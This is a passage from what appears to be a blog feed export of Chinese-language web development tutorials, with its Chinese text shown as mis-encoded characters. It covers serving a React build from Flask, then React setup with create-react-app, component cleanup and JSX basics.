style="zoom:50%;"><p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-flask-hou-duan-fen-chi-kai-fa/%E6%88%AA%E5%B1%8F2024-12-10%2010.08.24.png" alt="æˆªå±2024-12-10 10.08.24"></p><h3 id="6-2-3-è®¾ç½®-Flask-æä¾›é™æ€æ–‡ä»¶æœåŠ¡"><a href="#6-2-3-è®¾ç½®-Flask-æä¾›é™æ€æ–‡ä»¶æœåŠ¡" class="headerlink" title="6.2.3 è®¾ç½® Flask æä¾›é™æ€æ–‡ä»¶æœåŠ¡"></a>6.2.3 è®¾ç½® Flask æä¾›é™æ€æ–‡ä»¶æœåŠ¡</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> jsonify<span class="token punctuation">,</span> send_from_directory<span class="token keyword">from</span> flask_cors <span class="token keyword">import</span> CORSapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">,</span> static_folder<span class="token operator">=</span><span class="token string">'build'</span><span class="token punctuation">)</span>CORS<span class="token punctuation">(</span>app<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">serve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> send_from_directory<span class="token punctuation">(</span>app<span class="token punctuation">.</span>static_folder<span class="token punctuation">,</span> <span class="token string">'index.html'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/api/message'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_message</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"Hello from Flask!"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="6-2-4-è®¿é—®æµ‹è¯•"><a href="#6-2-4-è®¿é—®æµ‹è¯•" class="headerlink" title="6.2.4 è®¿é—®æµ‹è¯•"></a>6.2.4 è®¿é—®æµ‹è¯•</h3><p>å¯åŠ¨ Flask é¡¹ç›®åï¼Œç›´æ¥è®¿é—®æ ¹è·¯å¾„ <code>http://127.0.0.1:5000</code>ã€‚</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-flask-hou-duan-fen-chi-kai-fa/%E6%88%AA%E5%B1%8F2024-12-10%2010.15.20.png" style="zoom:50%;"><p>é¦–é¡µä¸ºç©ºï¼Œé™æ€èµ„æºä¸‹è½½å¤±è´¥ã€‚</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-flask-hou-duan-fen-chi-kai-fa/%E6%88%AA%E5%B1%8F2024-12-10%2010.23.14.png" style="zoom:50%;"><h3 id="6-2-5-ä¿®æ”¹-package-json"><a href="#6-2-5-ä¿®æ”¹-package-json" class="headerlink" title="6.2.5 ä¿®æ”¹ package.json"></a>6.2.5 ä¿®æ”¹ <code>package.json</code></h3><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token property">"homepage"</span><span class="token operator">:</span> <span class="token string">"."</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/09/qian-hou-duan-kai-fa/react-flask-hou-duan-fen-chi-kai-fa/%E6%88%AA%E5%B1%8F2024-12-10%2010.26.43.png" alt="æˆªå±2024-12-10 10.26.43" style="zoom:50%;"><p>é‡æ–°æ„å»ºé¡¹ç›®ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> run build<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>é‡æ–°æµ‹è¯•ï¼š</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-flask-hou-duan-fen-chi-kai-fa/%E6%88%AA%E5%B1%8F2024-12-10%2010.28.54.png" alt="æˆªå±2024-12-10 10.28.54" style="zoom:50%;"><p>ä»ç„¶å¤±è´¥ã€‚</p><h3 id="6-2-6-é—®é¢˜è¿›ä¸€æ­¥åˆ†æ"><a href="#6-2-6-é—®é¢˜è¿›ä¸€æ­¥åˆ†æ" class="headerlink" title="6.2.6 é—®é¢˜è¿›ä¸€æ­¥åˆ†æ"></a>6.2.6 é—®é¢˜è¿›ä¸€æ­¥åˆ†æ</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://127.0.0.1:5000/build/static/css/main.e6c13ad2.css<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/09/qian-hou-duan-kai-fa/react-flask-hou-duan-fen-chi-kai-fa/%E6%88%AA%E5%B1%8F2024-12-10%2010.31.55.png" alt="æˆªå±2024-12-10 10.31.55" style="zoom:50%;"><p>æ·»åŠ buildç›®å½•èƒ½å¤ŸæˆåŠŸè®¿é—®ã€‚</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-flask-hou-duan-fen-chi-kai-fa/%E6%88%AA%E5%B1%8F2024-12-10%2010.35.37.png" style="zoom:50%;"><h3 id="6-2-7-é—®é¢˜è§£å†³"><a href="#6-2-7-é—®é¢˜è§£å†³" class="headerlink" title="6.2.7 é—®é¢˜è§£å†³"></a>6.2.7 é—®é¢˜è§£å†³</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">,</span> static_folder<span class="token operator">=</span><span class="token string">'build'</span><span class="token punctuation">,</span> static_url_path<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ·»åŠ é…ç½®ï¼šstatic_url_path=â€™â€™</p><h2 id="6-3-è®¿é—®æµ‹è¯•"><a href="#6-3-è®¿é—®æµ‹è¯•" class="headerlink" title="6.3 è®¿é—®æµ‹è¯•"></a>6.3 è®¿é—®æµ‹è¯•</h2><img src="/2024/12/09/qian-hou-duan-kai-fa/react-flask-hou-duan-fen-chi-kai-fa/%E6%88%AA%E5%B1%8F2024-12-10%2010.38.20.png" style="zoom:50%;"><p>è‡³æ­¤ï¼ŒæˆåŠŸå®Œæˆä¸€ä¸ªFlask+Reactçš„Demoç³»ç»Ÿã€‚</p><p>è¿›é˜¶æŠ€èƒ½ï¼Œåç»­ç»§ç»­åŠ ä»¥å­¦ä¹ ã€‚</p><h1 id="ç›®å½•ç»“æ„æ€»ç»“"><a href="#ç›®å½•ç»“æ„æ€»ç»“" class="headerlink" title="ç›®å½•ç»“æ„æ€»ç»“"></a>ç›®å½•ç»“æ„æ€»ç»“</h1><p>å‰ç«¯ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">react-frontend/â”œâ”€â”€ public/â”œâ”€â”€ src/â”‚   â”œâ”€â”€ App.jsâ”‚   â”œâ”€â”€ index.jsâ”œâ”€â”€ package.json<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åç«¯ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">flask-backend/â”œâ”€â”€ app.pyâ”œâ”€â”€ venv/â”œâ”€â”€ build/ <span class="token punctuation">(</span>React æ„å»ºçš„é™æ€æ–‡ä»¶<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> å‰åç«¯å¼€å‘ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å‰åç«¯å¼€å‘ </tag>
            
            <tag> Reactå’ŒFlask </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Reactå‰ç«¯æ¡†æ¶</title>
      <link href="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/"/>
      <url>/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸€ã€Reactä»‹ç»"><a href="#ä¸€ã€Reactä»‹ç»" class="headerlink" title="ä¸€ã€Reactä»‹ç»"></a>ä¸€ã€Reactä»‹ç»</h1><h2 id="1-1-ç®€ä»‹"><a href="#1-1-ç®€ä»‹" class="headerlink" title="1.1 ç®€ä»‹"></a>1.1 ç®€ä»‹</h2><p><strong>React</strong> æ˜¯ç”± <strong>Metaï¼ˆå‰ Facebookï¼‰</strong> å¼€å‘å¹¶å¼€æºçš„ä¸€ä¸ªç”¨äºæ„å»ºç”¨æˆ·ç•Œé¢çš„ JavaScript åº“ï¼Œï¼ˆå¯ç”¨äºæ„å»ºWebå’ŒåŸç”Ÿäº¤äº’ç•Œé¢ï¼‰ã€‚å®ƒä¸»è¦ç”¨äºåˆ›å»ºå•é¡µåº”ç”¨ï¼ˆSPA, Single Page Applicationï¼‰ï¼Œèƒ½å¤Ÿé€šè¿‡ç»„ä»¶åŒ–çš„å¼€å‘æ¨¡å¼æ„å»ºå¤æ‚çš„ç”¨æˆ·ç•Œé¢ã€‚</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-10%2014.23.55.png" style="zoom:30%;"><p>React æ˜¯ç°ä»£å‰ç«¯å¼€å‘ä¸­æœ€æµè¡Œçš„å·¥å…·ä¹‹ä¸€ï¼Œå‡­å€Ÿå…¶é«˜æ•ˆçš„è™šæ‹Ÿ DOMã€ç»„ä»¶åŒ–å¼€å‘æ¨¡å¼å’Œå¼ºå¤§çš„ç”Ÿæ€ç³»ç»Ÿï¼Œæˆä¸ºæ„å»ºç”¨æˆ·ç•Œé¢çš„é¦–é€‰æŠ€æœ¯ã€‚æ— è®ºæ˜¯ä¸­å°å‹é¡¹ç›®è¿˜æ˜¯å¤æ‚çš„å¤§å‹åº”ç”¨ï¼ŒReact éƒ½èƒ½æä¾›ä¼˜é›…çš„è§£å†³æ–¹æ¡ˆã€‚</p><h2 id="1-2-ä¼˜åŠ¿"><a href="#1-2-ä¼˜åŠ¿" class="headerlink" title="1.2 ä¼˜åŠ¿"></a>1.2 ä¼˜åŠ¿</h2><p>ç›¸è¾ƒäºä¼ ç»ŸåŸºäºDOMå¼€å‘çš„ä¼˜åŠ¿ï¼š</p><ol><li>ç»„ä»¶åŒ–çš„å¼€å‘æ–¹å¼</li><li>ä¸é”™çš„æ€§èƒ½</li></ol><p>ç›¸è¾ƒäºå…¶å®ƒå‰ç«¯æ¡†æ¶çš„ä¼˜åŠ¿</p><ol><li>ä¸°å¯Œçš„ç”Ÿæ€</li><li>è·¨å¹³å°æ”¯æŒ</li></ol><h2 id="1-3-Reactçš„å¸‚åœºæƒ…å†µ"><a href="#1-3-Reactçš„å¸‚åœºæƒ…å†µ" class="headerlink" title="1.3 Reactçš„å¸‚åœºæƒ…å†µ"></a>1.3 Reactçš„å¸‚åœºæƒ…å†µ</h2><p>å…¨çƒæœ€æµè¡Œï¼Œå¤§å‚å¿…å¤‡ã€‚</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-10%2014.25.19.png" style="zoom:20%;"><h1 id="äºŒã€å¼€å‘ç¯å¢ƒæ­å»º"><a href="#äºŒã€å¼€å‘ç¯å¢ƒæ­å»º" class="headerlink" title="äºŒã€å¼€å‘ç¯å¢ƒæ­å»º"></a>äºŒã€å¼€å‘ç¯å¢ƒæ­å»º</h1><h2 id="2-1-åˆå§‹åŒ–reactå·¥ç¨‹é¡¹ç›®"><a href="#2-1-åˆå§‹åŒ–reactå·¥ç¨‹é¡¹ç›®" class="headerlink" title="2.1 åˆå§‹åŒ–reactå·¥ç¨‹é¡¹ç›®"></a>2.1 åˆå§‹åŒ–reactå·¥ç¨‹é¡¹ç›®</h2><p>create-react-appæ˜¯ä¸€ä¸ªå¿«é€Ÿåˆ›å»ºReactå¼€å‘ç¯å¢ƒçš„å·¥å…·ï¼Œåº•å±‚ç”±Webpackæ„ä»¶ï¼Œå°è£…äº†é…ç½®ç»†èŠ‚ï¼Œå¼€ç®±å³ç”¨ã€‚</p><p>æ‰§è¡Œå‘½ä»¤ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">npx create-react-app react-basic<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><ol><li>npx -  Node.jså·¥å…·å‘½ä»¤ï¼ŒæŸ¥æ‰¾å¹¶æ‰§è¡Œåç»­çš„åŒ…å‘½ä»¤</li><li>create-react-app - æ ¸å¿ƒåŒ…ï¼ˆå›ºå®šå†™æ³•ï¼‰ï¼Œç”¨äºåˆ›å»ºReacté¡¹ç›®</li><li>react-basic  Reacté¡¹ç›®çš„åç§°ï¼ˆå¯ä»¥è‡ªå®šä¹‰ï¼‰</li></ol></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> react-basic<span class="token function">npm</span> start<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>bugè§£å†³ï¼š</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-10%2014.35.02.png" style="zoom:50%;"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> ajv@latest ajv-keywords@latest<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-10%2014.37.21.png" style="zoom:50%;"></blockquote><p>æµ‹è¯•ï¼šnpm start</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-10%2014.37.50.png" style="zoom:30%;"><h2 id="2-2-å…³é”®æ–‡ä»¶"><a href="#2-2-å…³é”®æ–‡ä»¶" class="headerlink" title="2.2 å…³é”®æ–‡ä»¶"></a>2.2 å…³é”®æ–‡ä»¶</h2><h3 id="2-2-1-package-json"><a href="#2-2-1-package-json" class="headerlink" title="2.2.1 package.json"></a>2.2.1 package.json</h3><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span>  <span class="token property">"dependencies"</span><span class="token operator">:</span> <span class="token punctuation">{</span>    <span class="token property">"react"</span><span class="token operator">:</span> <span class="token string">"^19.0.0"</span><span class="token punctuation">,</span>    <span class="token property">"react-dom"</span><span class="token operator">:</span> <span class="token string">"^19.0.0"</span><span class="token punctuation">,</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token property">"scripts"</span><span class="token operator">:</span> <span class="token punctuation">{</span>    <span class="token property">"start"</span><span class="token operator">:</span> <span class="token string">"react-scripts start"</span><span class="token punctuation">,</span>    <span class="token property">"build"</span><span class="token operator">:</span> <span class="token string">"react-scripts build"</span><span class="token punctuation">,</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>reactåŸºç¡€é¡¹ç›®çš„æ ¸å¿ƒä¾èµ–å’Œæ ¸å¿ƒè„šæœ¬ã€‚</p><h3 id="2-2-2-srcæºç ç›®å½•"><a href="#2-2-2-srcæºç ç›®å½•" class="headerlink" title="2.2.2 srcæºç ç›®å½•"></a>2.2.2 srcæºç ç›®å½•</h3><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-10%2014.42.22.png" style="zoom:50%;"><p>é™¤äº†é«˜äº®çš„ä¸¤ä¸ªæ–‡ä»¶ï¼Œå…¶ä»–éƒ½å¯ä»¥åˆ é™¤ã€‚</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-10%2014.44.10.png" style="zoom:50%;"><ul><li><p>index.jsæ¸…ç†</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">import</span> React <span class="token keyword">from</span> <span class="token string">'react'</span><span class="token punctuation">;</span><span class="token keyword">import</span> ReactDOM <span class="token keyword">from</span> <span class="token string">'react-dom/client'</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token string">'./index.css'</span><span class="token punctuation">;</span><span class="token keyword">import</span> App <span class="token keyword">from</span> <span class="token string">'./App'</span><span class="token punctuation">;</span><span class="token keyword">import</span> reportWebVitals <span class="token keyword">from</span> <span class="token string">'./reportWebVitals'</span><span class="token punctuation">;</span><span class="token keyword">const</span> root <span class="token operator">=</span> ReactDOM<span class="token punctuation">.</span><span class="token function">createRoot</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'root'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>root<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span>  <span class="token operator">&lt;</span>React<span class="token punctuation">.</span>StrictMode<span class="token operator">&gt;</span>    <span class="token operator">&lt;</span>App <span class="token operator">/</span><span class="token operator">&gt;</span>  <span class="token operator">&lt;</span><span class="token operator">/</span>React<span class="token punctuation">.</span>StrictMode<span class="token operator">&gt;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// If you want to start measuring performance in your app, pass a function</span><span class="token comment">// to log results (for example: reportWebVitals(console.log))</span><span class="token comment">// or send to an analytics endpoint. Learn more: https://bit.ly/CRA-vitals</span><span class="token function">reportWebVitals</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ¸…ç†åï¼š</p><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token keyword">import</span> React <span class="token keyword">from</span> <span class="token string">'react'</span><span class="token punctuation">;</span><span class="token keyword">import</span> ReactDOM <span class="token keyword">from</span> <span class="token string">'react-dom/client'</span><span class="token punctuation">;</span><span class="token keyword">import</span> App <span class="token keyword">from</span> <span class="token string">'./App'</span><span class="token punctuation">;</span><span class="token keyword">const</span> root <span class="token operator">=</span> ReactDOM<span class="token punctuation">.</span><span class="token function">createRoot</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'root'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>root<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">App</span></span> <span class="token punctuation">/&gt;</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>App.jsæ¸…ç†</p></li></ul><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token keyword">import</span> logo <span class="token keyword">from</span> <span class="token string">'./logo.svg'</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token string">'./App.css'</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">App</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">className</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>App<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token plain-text">      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>header</span> <span class="token attr-name">className</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>App-header<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token plain-text">        </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>logo<span class="token punctuation">}</span></span> <span class="token attr-name">className</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>App-logo<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>logo<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span><span class="token plain-text">        </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">          Edit </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>code</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">src/App.js</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>code</span><span class="token punctuation">&gt;</span></span><span class="token plain-text"> and save to reload.        </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">        </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span>          <span class="token attr-name">className</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>App-link<span class="token punctuation">"</span></span>          <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://reactjs.org<span class="token punctuation">"</span></span>          <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span>          <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>noopener noreferrer<span class="token punctuation">"</span></span>        <span class="token punctuation">&gt;</span></span><span class="token plain-text">          Learn React        </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>header</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>  <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">export</span> <span class="token keyword">default</span> App<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ¸…ç†åï¼š</p><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token keyword">function</span> <span class="token function">App</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">className</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>App<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token plain-text">        This is React App.    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>  <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">export</span> <span class="token keyword">default</span> App<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è®¿é—®æµ‹è¯•ï¼š</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-10%2014.50.58.png" style="zoom:50%;"><h2 id="2-3-æ¸²æŸ“é€»è¾‘"><a href="#2-3-æ¸²æŸ“é€»è¾‘" class="headerlink" title="2.3 æ¸²æŸ“é€»è¾‘"></a>2.3 æ¸²æŸ“é€»è¾‘</h2><h3 id="2-3-1-å…¥å£æ–‡ä»¶ï¼šindex-js"><a href="#2-3-1-å…¥å£æ–‡ä»¶ï¼šindex-js" class="headerlink" title="2.3.1 å…¥å£æ–‡ä»¶ï¼šindex.js"></a>2.3.1 å…¥å£æ–‡ä»¶ï¼šindex.js</h3><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">//é¡¹ç›®çš„å…¥å£ ä»è¿™é‡Œå¼€å§‹è¿è¡Œ</span><span class="token comment">//reactå¿…è¦çš„ä¸¤ä¸ªæ ¸å¿ƒåŒ…</span><span class="token keyword">import</span> React <span class="token keyword">from</span> <span class="token string">'react'</span><span class="token punctuation">;</span><span class="token keyword">import</span> ReactDOM <span class="token keyword">from</span> <span class="token string">'react-dom/client'</span><span class="token punctuation">;</span><span class="token comment">//å¯¼å…¥é¡¹ç›®çš„æ ¹ç»„ä»¶</span><span class="token keyword">import</span> App <span class="token keyword">from</span> <span class="token string">'./App'</span><span class="token punctuation">;</span><span class="token comment">//æŠŠAppæ ¹ç»„ä»¶æ¸²æŸ“åˆ°idä¸ºrootçš„domèŠ‚ç‚¹ä¸Š</span><span class="token keyword">const</span> root <span class="token operator">=</span> ReactDOM<span class="token punctuation">.</span><span class="token function">createRoot</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'root'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>root<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token operator">&lt;</span>App <span class="token operator">/</span><span class="token operator">&gt;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-3-2-idä¸ºrootçš„domèŠ‚ç‚¹"><a href="#2-3-2-idä¸ºrootçš„domèŠ‚ç‚¹" class="headerlink" title="2.3.2 idä¸ºrootçš„domèŠ‚ç‚¹"></a>2.3.2 idä¸ºrootçš„domèŠ‚ç‚¹</h3><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-10%2014.56.13.png" style="zoom:67%;"><h3 id="2-3-3-æ ¹ç»„ä»¶"><a href="#2-3-3-æ ¹ç»„ä»¶" class="headerlink" title="2.3.3 æ ¹ç»„ä»¶"></a>2.3.3 æ ¹ç»„ä»¶</h3><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token comment">//é¡¹ç›®çš„æ ¹ç»„ä»¶</span><span class="token keyword">function</span> <span class="token function">App</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">className</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>App<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token plain-text">        This is React App.    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>  <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">export</span> <span class="token keyword">default</span> App<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-3-4-æ¸²æŸ“æµç¨‹"><a href="#2-3-4-æ¸²æŸ“æµç¨‹" class="headerlink" title="2.3.4 æ¸²æŸ“æµç¨‹"></a>2.3.4 æ¸²æŸ“æµç¨‹</h3><p>Appæ ¹ç»„ä»¶-&gt;index.js-&gt;public/index.html(root)</p><h1 id="ä¸‰ã€JSXåŸºç¡€"><a href="#ä¸‰ã€JSXåŸºç¡€" class="headerlink" title="ä¸‰ã€JSXåŸºç¡€"></a>ä¸‰ã€JSXåŸºç¡€</h1><h2 id="3-1-ä»€ä¹ˆæ˜¯JSX"><a href="#3-1-ä»€ä¹ˆæ˜¯JSX" class="headerlink" title="3.1 ä»€ä¹ˆæ˜¯JSX"></a>3.1 ä»€ä¹ˆæ˜¯JSX</h2><p>JSXæ˜¯JavaScriptå’ŒXMl(HTML)çš„ç¼©å†™ï¼Œè¡¨ç¤ºåœ¨JSä»£ç 